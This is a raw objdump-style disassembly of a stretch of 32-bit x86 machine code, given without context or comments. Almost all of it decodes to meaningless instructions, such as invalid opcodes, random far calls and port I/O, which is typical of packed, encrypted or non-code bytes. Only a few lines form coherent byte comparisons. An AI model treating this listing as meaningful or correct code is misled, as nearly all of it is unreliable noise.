  404165:	pop    eax
  404166:	xor    ebp,DWORD PTR [edx]
  404168:	push   ebx
  404169:	push   cs
  40416a:	das    
  40416b:	inc    eax
  40416c:	(bad)  
  40416d:	mov    edx,0xa734cb1e
  404172:	mov    esi,0x99b4ca3c
  404177:	out    dx,al
  404178:	push   ebp
  404179:	imul   esp,esi,0x3e
  40417c:	xor    esi,DWORD PTR [ecx+ebx*1-0x2b]
  404180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404182:	mov    bl,0x40
  404184:	bound  esp,QWORD PTR [eax+0x7a]
  404187:	push   eax
  404188:	sar    DWORD PTR [edi+0x70],0x64
  40418c:	cdq    
  40418d:	push   es
  40418e:	cdq    
  40418f:	pop    eax
  404190:	adc    eax,0x67c61090
  404195:	pop    eax
  404196:	jp     0x4041a4
  404198:	mov    edx,0x7fab2cba
  40419d:	add    al,0xad
  40419f:	enter  0xff5,0x37
  4041a3:	mov    esi,es
  4041a5:	cdq    
  4041a6:	dec    DWORD PTR [edi]
  4041a8:	les    edi,FWORD PTR ds:0xbdca56d1
  4041ae:	repz (bad) 
  4041b0:	fstp   TBYTE PTR [edi+0x2d977e35]
  4041b6:	push   eax
  4041b7:	cmp    eax,0x874f9508
  4041bc:	cwde   
  4041bd:	icebp  
  4041be:	push   0x2b
  4041c0:	or     DWORD PTR [edi],eax
  4041c2:	es mov esp,0x9e10f881
  4041c8:	(bad)  
  4041ca:	out    dx,al
  4041cb:	push   edx
  4041cc:	loopne 0x4041fd
  4041ce:	ss inc ebx
  4041d0:	ins    BYTE PTR es:[edi],dx
  4041d1:	shr    ebp,cl
  4041d3:	addr16 mov ds:0x70c5,al
  4041d7:	(bad)  
  4041d8:	push   ds
  4041d9:	clc    
  4041da:	xchg   edi,eax
  4041db:	jl     0x404253
  4041dd:	fadd   DWORD PTR [edx]
  4041df:	jp     0x404180
  4041e1:	push   esi
  4041e2:	stos   BYTE PTR es:[edi],al
  4041e3:	icebp  
  4041e4:	stc    
  4041e5:	add    BYTE PTR [edi+0x59],bh
  4041e8:	sbb    edx,ebp
  4041ea:	stos   DWORD PTR es:[edi],eax
  4041eb:	fiadd  WORD PTR [ebp-0x30]
  4041ee:	mov    BYTE PTR [ebx],0xeb
  4041f1:	or     DWORD PTR [ebp+0x50310001],edi
  4041f7:	cmp    dl,bh
  4041f9:	lea    edi,[ecx+0x6539976f]
  4041ff:	rol    BYTE PTR [edi+0x4467b3ae],1
  404205:	ret    
  404206:	loop   0x404230
  404208:	inc    esp
  404209:	lods   eax,DWORD PTR ds:[esi]
  40420a:	sbb    ebp,DWORD PTR [esi+0x8]
  40420d:	pop    esi
  40420e:	mov    ebp,0x7b5b5c0a
  404213:	mov    cl,0x61
  404215:	mov    dl,0x8b
  404217:	rcl    dh,1
  404219:	scas   eax,DWORD PTR es:[edi]
  40421a:	or     al,0x20
  40421c:	or     bh,BYTE PTR [ebx+ebx*8]
  40421f:	hlt    
  404220:	rcr    BYTE PTR [ecx-0x76c6866c],cl
  404226:	hlt    
  404227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404228:	sbb    eax,0x62668c8
  40422d:	inc    esi
  40422e:	and    BYTE PTR [eax+0x4e],ah
  404231:	pop    ds
  404232:	out    dx,al
  404233:	lea    edx,[ebx+ebx*2+0x78d05c4]
  40423a:	jl     0x404296
  40423c:	repz shl BYTE PTR [edi-0x4df5d0a],cl
  404243:	lods   al,BYTE PTR ds:[esi]
  404244:	sbb    BYTE PTR [esi+0x6c],ch
  404247:	sbb    DWORD PTR [edx-0x6208aa67],ebx
  40424d:	jl     0x4042c5
  40424f:	mov    al,0x71
  404251:	cli    
  404252:	and    edx,DWORD PTR [ecx+eax*4]
  404255:	std    
  404256:	sar    al,cl
  404258:	cdq    
  404259:	pop    ebp
  40425a:	jge    0x4041ec
  40425c:	pusha  
  40425d:	inc    edx
  40425e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40425f:	test   eax,0x9f68c737
  404264:	inc    edi
  404265:	xor    eax,0xf54f4069
  40426a:	daa    
  40426b:	rcr    ch,0x6b
  40426e:	jecxz  0x40421b
  404270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404271:	dec    edi
  404272:	cmc    
  404273:	lods   al,BYTE PTR ds:[esi]
  404274:	arpl   WORD PTR [edi+edi*1],bx
  404277:	test   BYTE PTR [ecx+0x14],0xb7
  40427b:	popf   
  40427c:	inc    edi
  40427d:	inc    ecx
  40427e:	fsub   QWORD PTR [edi]
  404280:	imul   edx,DWORD PTR [eax+ebx*4-0x2b],0x10c1b3f4
  404288:	push   esp
  404289:	and    BYTE PTR ss:[esi*8+0x6e8aafe],cl
  404291:	mov    cl,0x57
  404293:	push   ds
  404294:	cmp    ah,BYTE PTR [ebp-0x6c]
  404297:	or     bh,ah
  404299:	fwait
  40429a:	inc    ebx
  40429b:	mov    dl,al
  40429d:	mov    ch,0x95
  40429f:	fadd   DWORD PTR [eax+0x28]
  4042a2:	aaa    
  4042a3:	and    al,0x78
  4042a5:	xchg   edx,eax
  4042a7:	das    
  4042a8:	jo     0x404272
  4042aa:	mov    BYTE PTR [edx-0x4a9e6721],al
  4042b0:	inc    ecx
  4042b1:	pop    esi
  4042b2:	xor    al,0x9c
  4042b4:	dec    esi
  4042b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042b6:	mov    ebp,0x69db986f
  4042bb:	mov    ds,WORD PTR ds:0x18ab5818
  4042c1:	xor    BYTE PTR [esi+0x63],dh
  4042c4:	daa    
  4042c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c6:	xchg   ebp,eax
  4042c7:	test   eax,0xe3b8a182
  4042cc:	aad    0xdb
  4042ce:	out    0xb9,eax
  4042d0:	enter  0xc915,0x19
  4042d4:	imul   esp,DWORD PTR [esi],0xffffffc1
  4042d7:	mov    dl,0x8c
  4042d9:	je     0x404339
  4042db:	push   ss
  4042dc:	and    eax,0x1e950a17
  4042e1:	lahf   
  4042e2:	sub    al,0xce
  4042e4:	fnstcw WORD PTR [edx+esi*4-0x60]
  4042e8:	cld    
  4042e9:	adc    BYTE PTR [ebx],dl
  4042eb:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4042ed:	sbb    esi,esi
  4042ef:	xor    BYTE PTR [eax+0x77638556],cl
  4042f5:	xchg   ecx,eax
  4042f6:	aad    0xf6
  4042f8:	add    eax,0xe4e47b92
  4042fd:	ret    0xae77
  404300:	js     0x404362
  404302:	(bad)  
  404303:	xchg   esi,eax
  404304:	mov    ecx,0x6615177e
  404309:	aam    0x78
  40430b:	push   ebp
  40430c:	fwait
  40430d:	loop   0x40430a
  40430f:	or     eax,DWORD PTR [ebp-0x9]
  404312:	retf   
  404313:	inc    esp
  404314:	aad    0x0
  404316:	inc    edi
  404317:	out    dx,eax
  404318:	dec    ebx
  404319:	sub    al,0xb9
  40431b:	retf   0x9582
  40431e:	test   ecx,0x99cc6208
  404324:	stos   DWORD PTR es:[edi],eax
  404325:	pop    ebp
  404326:	mov    eax,ds:0xe382e9b2
  40432b:	int    0x88
  40432d:	ins    DWORD PTR es:[edi],dx
  40432e:	dec    eax
  40432f:	jb     0x4042c4
  404331:	lea    esp,[eax-0x7d]
  404334:	adc    ebp,DWORD PTR [esi]
  404336:	sub    DWORD PTR ds:0x4fff588a,0x13
  40433d:	mov    edx,0x3067ee43
  404342:	jo     0x404385
  404344:	mov    ds:0x93c1712f,al
  404349:	jl     0x40439d
  40434b:	jns    0x404377
  40434d:	jmp    0x40434c
  40434f:	fadd   st,st(1)
  404351:	mov    bl,0x8b
  404353:	jg     0x404375
  404355:	jg     0x404346
  404357:	aad    0x77
  404359:	xor    bh,bl
  40435b:	(bad)  
  40435c:	mov    esp,0x6af15019
  404361:	cmp    al,0x7c
  404363:	adc    DWORD PTR [eax+edi*8-0x57],edi
  404367:	in     eax,0x34
  404369:	jmp    0x40436b
  40436b:	scas   eax,DWORD PTR es:[edi]
  40436c:	or     esi,DWORD PTR [ebx]
  40436e:	imul   edi,DWORD PTR [esi+ebp*4+0x4],0x58
  404373:	lods   eax,DWORD PTR ds:[esi]
  404374:	cmp    al,0xcf
  404376:	hlt    
  404377:	xchg   BYTE PTR [edx],bl
  404379:	cmp    DWORD PTR ds:0x341c12ca,0x5ae81c98
  404383:	cdq    
  404384:	mov    cl,0x15
  404386:	repnz pop eax
  404388:	ss fucom st(6)
  40438b:	dec    ebx
  40438c:	push   0x6a
  40438e:	push   0xffffffd9
  404390:	ret    
  404391:	inc    edi
  404392:	inc    ebp
  404393:	data16 jg 0x4043b6
  404396:	outs   dx,BYTE PTR ds:[esi]
  404397:	push   ss
  404398:	imul   edi,DWORD PTR [ecx-0x705dee00],0x834229a8
  4043a2:	or     esi,DWORD PTR [ebp+0xb0ea8ff]
  4043a8:	xor    ebp,DWORD PTR [ebx-0x758bf6f5]
  4043ae:	jb     0x40438f
  4043b0:	mov    dl,0xa2
  4043b2:	ficomp DWORD PTR [ecx]
  4043b4:	and    al,0xf
  4043b6:	mov    al,ds:0xc268d433
  4043bb:	test   eax,0xdc180fee
  4043c0:	push   ss
  4043c1:	mov    ds:0x8213edbc,eax
  4043c6:	mov    ds:0x91cdb06,eax
  4043cb:	push   ss
  4043cc:	cmp    ebp,edi
  4043ce:	xor    al,0x16
  4043d0:	lock jo 0x4043bc
  4043d3:	div    BYTE PTR [eax-0x1e37eec6]
  4043d9:	xchg   edi,eax
  4043da:	mov    DWORD PTR [esi-0x71],0x126503d7
  4043e1:	nop
  4043e2:	js     0x404454
  4043e4:	dec    edi
  4043e5:	dec    edx
  4043e6:	jge    0x40439c
  4043e8:	xlat   BYTE PTR ds:[ebx]
  4043e9:	bound  ecx,QWORD PTR [ebx-0x689e730c]
  4043ef:	call   0x2961:0xc08865cb
  4043f6:	lea    ebx,[edi+0x2bc3a4cb]
  4043fc:	push   esi
  4043fd:	jmp    0xc995:0x439e3e98
  404404:	out    dx,eax
  404405:	jns    0x4043d3
  404407:	icebp  
  404408:	mov    dh,al
  40440a:	push   ebp
  40440b:	jmp    0xa3756d7b
  404410:	sbb    eax,0xded415f0
  404415:	push   edi
  404416:	push   edx
  404417:	xchg   esi,eax
  404418:	fstp   DWORD PTR [edi-0x4aadb67f]
  40441e:	or     ebx,DWORD PTR [edi+0x40]
  404421:	fsubr  st(5),st
  404423:	jns    0x4043df
  404425:	push   eax
  404426:	mov    cl,0xfa
  404428:	scas   eax,DWORD PTR es:[edi]
  404429:	mov    eax,0xf3f51a5b
  40442e:	inc    edx
  40442f:	in     al,0x8
  404431:	idiv   DWORD PTR [eax+0x5b9d9df7]
  404437:	mov    ecx,0x4280445f
  40443c:	lahf   
  40443d:	sti    
  40443e:	or     eax,0x199eb7bd
  404443:	(bad)  
  404444:	sbb    BYTE PTR [ecx-0x5fe46ea8],cl
  40444a:	jmp    0x4044a0
  40444c:	inc    ebp
  40444d:	xchg   esp,eax
  40444e:	inc    ebp
  40444f:	outs   dx,DWORD PTR ds:[esi]
  404450:	nop
  404451:	dec    eax
  404452:	cmp    dl,BYTE PTR [eax-0x156857da]
  404458:	mov    es,WORD PTR [esi]
  40445a:	adc    edi,DWORD PTR [esi-0x4eb02b9e]
  404460:	scas   al,BYTE PTR es:[edi]
  404461:	push   0x4d6ed844
  404466:	sbb    eax,0x7e8daa13
  40446b:	and    ebp,esi
  40446d:	mov    edx,DWORD PTR [ebx]
  40446f:	out    0xbf,eax
  404471:	adc    BYTE PTR [ebp-0x3e],0x13
  404475:	stos   BYTE PTR es:[edi],al
  404476:	fwait
  404477:	sbb    al,0x2a
  404479:	xchg   ah,dl
  40447b:	sahf   
  40447c:	lods   al,BYTE PTR ds:[esi]
  40447d:	shl    BYTE PTR [edi+esi*8+0x55],0xfc
  404482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404483:	call   0x949f:0xaa8570d9
  40448a:	fidiv  DWORD PTR [edi+0x2c]
  40448d:	mov    ch,BYTE PTR [esp+edx*4+0x45]
  404491:	stc    
  404492:	outs   dx,BYTE PTR ds:[esi]
  404493:	jno    0x4044ff
  404495:	sub    eax,0xa6381ce1
  40449a:	ss aad 0x67
  40449d:	jg     0x4044e8
  40449f:	arpl   WORD PTR [edx+eax*8],bx
  4044a2:	sub    eax,0x522007f0
  4044a7:	neg    BYTE PTR ds:0xa966e77a
  4044ad:	xor    edi,DWORD PTR [esi]
  4044af:	xchg   ebx,eax
  4044b0:	ret    
  4044b1:	jbe    0x4044fd
  4044b3:	dec    ebx
  4044b4:	mov    ds:0x4f15f576,eax
  4044b9:	(bad)  
  4044ba:	sti    
  4044bb:	mov    eax,0x8e6e5011
  4044c0:	pushf  
  4044c1:	mov    bh,0xb4
  4044c3:	out    dx,al
  4044c4:	(bad)  
  4044c5:	sub    edx,DWORD PTR [esi+0x77]
  4044c8:	mov    esp,0x7c1bb8b1
  4044cd:	mov    edx,DWORD PTR [esi]
  4044cf:	retf   
  4044d0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044d4:	mov    dl,BYTE PTR [ebp-0x1]
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40450c:	pop    es
  40450d:	in     al,dx
  40450e:	shr    ebx,1
  404510:	daa    
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x4044cb
  404518:	test   eax,0x985c43e6
  40451d:	xor    BYTE PTR [si+0x3c],al
  404521:	mov    DWORD PTR [ecx+0x53],esi
  404524:	bound  edx,QWORD PTR [edx-0x80]
  404527:	in     eax,0xdd
  404529:	push   ecx
  40452a:	rcl    DWORD PTR [ecx+0x42f9c10f],1
  404530:	and    DWORD PTR [edx+0x17],0x6c0c0652
  404537:	push   edx
  404538:	xor    DWORD PTR [edx-0x418b6181],esp
  40453e:	popf   
  40453f:	(bad)  
  404540:	lods   al,BYTE PTR ds:[esi]
  404541:	popf   
  404542:	dec    eax
  404543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404544:	or     dh,BYTE PTR [ebx+eax*8]
  404547:	pop    ecx
  404548:	mov    ds:0x8fbde0c0,eax
  40454d:	add    BYTE PTR [esi-0x1a0d5c15],bh
  404553:	out    dx,al
  404554:	les    eax,FWORD PTR [edx]
  404556:	scas   al,BYTE PTR es:[edi]
  404557:	pop    eax
  404558:	pop    ebp
  404559:	inc    edx
  40455a:	popa   
  40455b:	shl    BYTE PTR [esi-0x2d],1
  40455e:	mov    ds:0x5bcf5569,eax
  404563:	mov    eax,0x1c27e3fe
  404568:	cmp    BYTE PTR [eax+0x2da806d4],dl
  40456e:	mov    al,0x64
  404570:	push   ebx
  404571:	ror    bh,1
  404573:	jg     0x404540
  404575:	pop    edi
  404576:	data16 cld 
  404578:	mov    ebx,0x4341e812
  40457d:	aad    0xed
  40457f:	push   esi
  404580:	addr16 inc esi
  404582:	imul   esi,eax,0x73c2fc12
  404588:	lock push 0x571ebbb
  40458e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40458f:	mov    esi,0xc951d8ef
  404594:	mov    bh,0x76
  404596:	mov    ah,0x16
  404598:	push   edx
  404599:	pop    edx
  40459a:	adc    eax,0xf8618359
  40459f:	out    dx,al
  4045a0:	mov    edi,0xb9c26f48
  4045a5:	adc    BYTE PTR [ebx+0x5f],dh
  4045a8:	scas   al,BYTE PTR es:[edi]
  4045a9:	dec    eax
  4045aa:	xor    al,0x4f
  4045ac:	inc    edx
  4045ad:	fisub  DWORD PTR [eax+0x6b4ca478]
  4045b3:	xchg   ecx,eax
  4045b4:	imul   ebp,edi,0xe347ed69
  4045ba:	and    edi,DWORD PTR [edi-0x19cb72bd]
  4045c0:	jle    0x404628
  4045c2:	retf   
  4045c3:	jo     0x404582
  4045c5:	cli    
  4045c6:	jge    0x40461c
  4045c8:	push   ebp
  4045c9:	ror    DWORD PTR [esi],1
  4045cb:	cmc    
  4045cc:	out    dx,eax
  4045cd:	xor    dl,bh
  4045cf:	cmp    BYTE PTR [ebx+0x43cbfbdc],0xc5
  4045d6:	das    
  4045d7:	jecxz  0x404584
  4045d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045da:	stc    
  4045db:	cvttps2pi mm5,QWORD PTR [edi]
  4045de:	outs   dx,BYTE PTR ds:[esi]
  4045df:	adc    eax,0x2acf36e2
  4045e4:	sbb    BYTE PTR [ecx-0x11f18825],dh
  4045ea:	mov    cl,BYTE PTR [ebx+eax*4+0x3c930095]
  4045f1:	lock js 0x4045fc
  4045f4:	xor    BYTE PTR [esi+ecx*4+0x16],cl
  4045f8:	mov    fs,WORD PTR [esi-0x1d]
  4045fb:	mov    edi,0x804d637e
  404600:	test   BYTE PTR [eax+0xb3e4bad],dh
  404606:	cli    
  404607:	mov    dh,0x77
  404609:	jl     0x4045d3
  40460b:	and    BYTE PTR [ecx-0x26d95a3b],0xa
  404612:	xor    eax,0xea68783a
  404617:	rcl    DWORD PTR gs:[esi-0x4],0xae
  40461c:	xchg   dl,ah
  40461e:	inc    esp
  40461f:	data16 sub ah,bh
  404622:	cmp    al,0x2c
  404624:	and    ebp,DWORD PTR [edi+0x2c]
  404627:	(bad)  
  404628:	cmp    BYTE PTR [edx-0x7b],ch
  40462b:	mov    cl,0xa1
  40462d:	sti    
  40462e:	push   ecx
  40462f:	les    edx,FWORD PTR [edx-0x8]
  404632:	rcr    BYTE PTR [edi],0xb6
  404635:	in     al,0x61
  404637:	das    
  404638:	mov    ebx,0xdc98c4d5
  40463d:	mov    eax,ds:0x4e501c88
  404642:	push   ecx
  404643:	pop    esi
  404644:	mov    WORD PTR [si],cs
  404647:	mov    bh,0x23
  404649:	mov    edx,0x6065eef6
  40464e:	ds adc al,0xcb
  404651:	addr16 mov bh,0xe
  404654:	mov    DWORD PTR [esi-0x59d94bdf],ecx
  40465a:	jmp    0xcc2:0xc15f12b5
  404661:	mov    esp,ecx
  404663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404664:	add    edx,ebx
  404666:	mov    dh,0x78
  404668:	fs add eax,0xf925c5c7
  40466e:	pushf  
  40466f:	jo     0x4046c9
  404671:	add    esp,DWORD PTR [eax+0x70]
  404674:	mov    ecx,0xd851cfdb
  404679:	push   ds
  40467a:	jmp    0x404674
  40467c:	jb     0x40467a
  40467e:	in     eax,0x39
  404680:	mov    ebx,0xfe48b352
  404685:	inc    ecx
  404686:	inc    edi
  404687:	xchg   ebp,eax
  404688:	in     eax,0x9a
  40468a:	push   ebx
  40468b:	or     DWORD PTR [esi],eax
  40468d:	mov    ?,WORD PTR [eax-0x5aadef0b]
  404693:	mov    ds:0xe782c5da,al
  404698:	stc    
  404699:	nop
  40469a:	pop    ds
  40469b:	call   0x26b7:0xf55366c2
  4046a2:	add    eax,0x90b7f808
  4046a7:	cwd    
  4046a9:	pop    ebx
  4046aa:	inc    edi
  4046ab:	mov    esp,0xf129f99a
  4046b0:	push   eax
  4046b1:	pop    ecx
  4046b2:	cmp    ah,BYTE PTR [ecx+ebp*8-0x3742fa84]
  4046b9:	aas    
  4046ba:	fld    st(1)
  4046bc:	inc    eax
  4046bd:	fldenv [esp+ebp*1+0x73]
  4046c1:	inc    edi
  4046c2:	les    esi,FWORD PTR [edx]
  4046c4:	cmp    BYTE PTR [ebx],bl
  4046c6:	push   0x1a
  4046c8:	in     eax,0xa2
  4046ca:	pop    esi
  4046cb:	cmp    dl,ch
  4046cd:	in     al,0xb
  4046cf:	loop   0x4046ba
  4046d1:	push   ss
  4046d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046d3:	sahf   
  4046d4:	jbe    0x4046a0
  4046d6:	adc    bl,BYTE PTR [edx+0x36]
  4046d9:	jno    0x4046b3
  4046db:	cwde   
  4046dc:	pop    ebx
  4046dd:	inc    ebx
  4046de:	nop
  4046df:	out    dx,eax
  4046e0:	scas   al,BYTE PTR es:[edi]
  4046e1:	jo     0x40469b
  4046e3:	imul   esi,DWORD PTR [edi-0x4b],0x52
  4046e7:	jbe    0x4046b2
  4046e9:	dec    eax
  4046ea:	pushf  
  4046eb:	pusha  
  4046ec:	mov    dh,0xca
  4046ee:	mov    ds:0xee8b6458,eax
  4046f3:	mov    ebp,0x2009adf7
  4046f8:	push   eax
  4046f9:	push   ss
  4046fa:	inc    esp
  4046fb:	mul    BYTE PTR [ecx]
  4046fd:	sbb    dl,cl
  4046ff:	outs   dx,DWORD PTR ds:[esi]
  404700:	sbb    al,0x2f
  404702:	fbld   TBYTE PTR [esi+0x56173969]
  404708:	rcl    DWORD PTR [ebp-0x5],1
  40470b:	test   DWORD PTR [eax+0x15204439],eax
  404711:	hlt    
  404712:	inc    edi
  404713:	mov    ds:0xbff4685a,eax
  404718:	repz arpl WORD PTR [edx-0xab8b567],dx
  40471f:	mov    ch,0x45
  404721:	mov    DWORD PTR [ecx-0x3f],edx
  404724:	loopne 0x404740
  404726:	push   esp
  404727:	mov    al,bh
  404729:	sar    bl,0x63
  40472c:	jmp    0x4046e4
  40472e:	push   eax
  40472f:	pop    esp
  404730:	xchg   ecx,eax
  404731:	mov    DWORD PTR [eax+0x6d],ebp
  404734:	sub    esp,edi
  404736:	mov    ?,WORD PTR [edi+0x3248a4d5]
  40473c:	cdq    
  40473d:	aad    0x18
  40473f:	or     al,0x9b
  404741:	pop    edi
  404742:	mov    edi,0xe3061f1
  404747:	js     0x4047bb
  404749:	adc    ebx,DWORD PTR [ecx-0xb]
  40474c:	jle    0x4046e4
  40474e:	cli    
  40474f:	je     0x4046d3
  404751:	or     BYTE PTR [esp+ebp*8-0x57],bh
  404755:	pop    edi
  404756:	outs   dx,DWORD PTR ds:[esi]
  404757:	mov    eax,0x54865895
  40475c:	jns    0x4046ea
  40475e:	sbb    BYTE PTR [ebp-0x734c691f],dh
  404764:	fsubr  QWORD PTR [ebp+0x0]
  404767:	push   ds
  404768:	loop   0x40476e
  40476a:	mov    ds:0xd2085d2c,al
  40476f:	adc    bl,BYTE PTR [edx-0x3d]
  404772:	pop    esp
  404773:	cmp    eax,0xfa351b8d
  404778:	cmp    eax,DWORD PTR [esi+ecx*8+0x7df6afde]
  40477f:	xchg   ebp,eax
  404780:	fld    QWORD PTR [ebp-0x78]
  404783:	cmp    esp,DWORD PTR [esi+0x42]
  404786:	pop    ecx
  404787:	fnop   
  404789:	sub    BYTE PTR [edx],cl
  40478b:	dec    edx
  40478c:	sbb    edx,DWORD PTR [eax]
  40478e:	mov    ebx,0xde529a7c
  404793:	mov    dl,0x90
  404795:	mov    bl,0xae
  404798:	cwde   
  404799:	aad    0x64
  40479b:	rcl    edi,0xa9
  40479e:	dec    ebp
  40479f:	jns    0x404728
  4047a1:	in     al,dx
  4047a2:	fld    TBYTE PTR [eax-0x1f3d24f9]
  4047a8:	adc    ch,BYTE PTR [ecx-0x5797946c]
  4047ae:	inc    esp
  4047af:	jle    0x404760
  4047b1:	fistp  DWORD PTR [ebx+0x4c3c0fb1]
  4047b7:	(bad)  
  4047b8:	xlat   BYTE PTR ds:[ebx]
  4047b9:	in     eax,0x1b
  4047bb:	rcr    bl,cl
  4047bd:	idiv   DWORD PTR [ebx]
  4047bf:	retf   0xd415
  4047c2:	out    0x93,eax
  4047c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047c5:	or     BYTE PTR [ecx],dl
  4047c7:	mov    ecx,0xe323aeb4
  4047cc:	adc    DWORD PTR [ebp+edx*4-0x53d5fa6b],esp
  4047d3:	mov    ebx,0xe451be47
  4047d8:	(bad)  
  4047d9:	pushf  
  4047da:	bound  esi,QWORD PTR [ecx]
  4047dc:	mov    al,0x56
  4047de:	and    eax,0x5d00bc26
  4047e3:	outs   dx,BYTE PTR cs:[esi]
  4047e5:	pop    edx
  4047e6:	shl    DWORD PTR [ebx],1
  4047e8:	mov    eax,ds:0x1303a7c6
  4047ed:	pop    edi
  4047ee:	mov    ebx,0x68b773c4
  4047f3:	and    al,0x4d
  4047f5:	add    eax,0x2e0c2e31
  4047fa:	leave  
  4047fb:	xor    BYTE PTR [edx],0x97
  4047fe:	into   
  4047ff:	add    eax,0x3112180a
  404804:	mov    dh,0x32
  404806:	mov    edx,0x74bd3e21
  40480b:	aam    0xd4
  40480d:	inc    eax
  40480e:	sub    bl,BYTE PTR [esi]
  404810:	sub    dh,BYTE PTR [esi+eax*2]
  404813:	into   
  404814:	call   0x86da:0x16423fee
  40481b:	xor    eax,0xc11273a8
  404820:	sbb    DWORD PTR cs:[edi+0x39],esi
  404824:	sbb    DWORD PTR [ebx+0x4a],eax
  404827:	std    
  404828:	pop    eax
  404829:	jmp    0x40482e
  40482b:	jg     0x404803
  40482d:	xchg   ecx,eax
  40482e:	lea    edi,[esi+0x2dffef8e]
  404834:	xchg   esi,eax
  404835:	push   es
  404836:	int3   
  404837:	pop    eax
  404838:	sahf   
  404839:	cmp    DWORD PTR [eax+ebp*2+0x1f],edx
  40483d:	jle    0x404808
  40483f:	sub    BYTE PTR [edx],dl
  404841:	jl     0x404883
  404843:	jae    0x4047d8
  404845:	stc    
  404846:	out    dx,eax
  404847:	mov    esi,0x4faad438
  40484c:	sub    bh,BYTE PTR [edi-0x73]
  40484f:	in     al,0x24
  404851:	addr16 mov edx,0x3de4d15a
  404857:	repz cmp DWORD PTR [esp+ecx*2+0x5d40bfb4],eax
  40485f:	pop    ecx
  404860:	dec    edx
  404861:	shl    DWORD PTR [eax-0x5f2aed8e],1
  404867:	mov    ebp,0x680072fd
  40486c:	lock inc ebp
  40486e:	dec    eax
  40486f:	mov    eax,0x23aee245
  404874:	icebp  
  404875:	call   0xad768602
  40487a:	sti    
  40487b:	add    ch,ch
  40487d:	xchg   edx,eax
  40487e:	dec    edx
  40487f:	mov    ecx,0xe05fceed
  404884:	js     0x4048c5
  404886:	or     edi,edi
  404888:	mov    DWORD PTR [eax-0x23257354],ebp
  40488e:	xchg   esp,eax
  40488f:	add    al,0xcf
  404891:	push   esi
  404892:	je     0x40481a
  404894:	inc    edi
  404895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404896:	inc    esi
  404897:	dec    edi
  404898:	mov    al,0x4b
  40489a:	retf   0x8218
  40489d:	cli    
  40489e:	push   cs
  40489f:	gs add al,0x2f
  4048a2:	out    0xbc,eax
  4048a4:	push   es
  4048a5:	inc    esi
  4048a6:	push   ebx
  4048a7:	aaa    
  4048a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048a9:	xlat   BYTE PTR ds:[ebx]
  4048aa:	pop    ebp
  4048ab:	stc    
  4048ac:	fnstsw WORD PTR [esi+0x4747f622]
  4048b2:	icebp  
  4048b3:	sub    eax,0xd3990d1
  4048b8:	lods   eax,DWORD PTR ds:[esi]
  4048b9:	ja     0x404882
  4048bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048bc:	fcom   DWORD PTR [edx+0x314ea9de]
  4048c2:	bswap  ebx
  4048c4:	sub    eax,0xf0c94a45
  4048c9:	adc    dh,BYTE PTR [ebx+0x3a29c0e5]
  4048cf:	lods   eax,DWORD PTR gs:[esi]
  4048d1:	mov    dl,0xac
  4048d3:	(bad)  
  4048d4:	int3   
  4048d5:	test   DWORD PTR [ebx],eax
  4048d7:	sub    al,al
  4048d9:	jo     0x4048d8
  4048db:	inc    edx
  4048dc:	add    esp,DWORD PTR [edi-0x7d]
  4048df:	and    BYTE PTR [ebx-0x10],cl
  4048e2:	push   DWORD PTR [ecx+0x5f]
  4048e5:	jne    0x4048f1
  4048e7:	frstor [esi]
  4048e9:	xchg   edx,eax
  4048ea:	pop    ecx
  4048eb:	call   0x33ad6a17
  4048f0:	rol    DWORD PTR [ebx],0xc6
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	lahf   
  40491a:	jmp    0x7e7e:0x23c34eec
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x40495a
  404926:	fiadd  WORD PTR [esi+0x79]
  404929:	dec    edx
  40492a:	test   al,0x91
  40492c:	pop    eax
  40492d:	enter  0xc449,0x3c
  404931:	inc    ecx
  404932:	jmp    0x4048da
  404934:	add    esp,DWORD PTR ds:[ecx]
  404937:	imul   ebx,edi,0x60
  40493a:	out    dx,al
  40493b:	sub    DWORD PTR [esi+0x4c],0xd370dfaf
  404942:	jmp    0x520a1cfe
  404947:	(bad)  
  404948:	xor    eax,0x236017ee
  40494d:	inc    ebx
  40494e:	mov    dh,0xff
  404950:	outs   dx,DWORD PTR ds:[esi]
  404951:	mov    cl,0x8b
  404953:	pop    ds
  404954:	xor    eax,0x638658b8
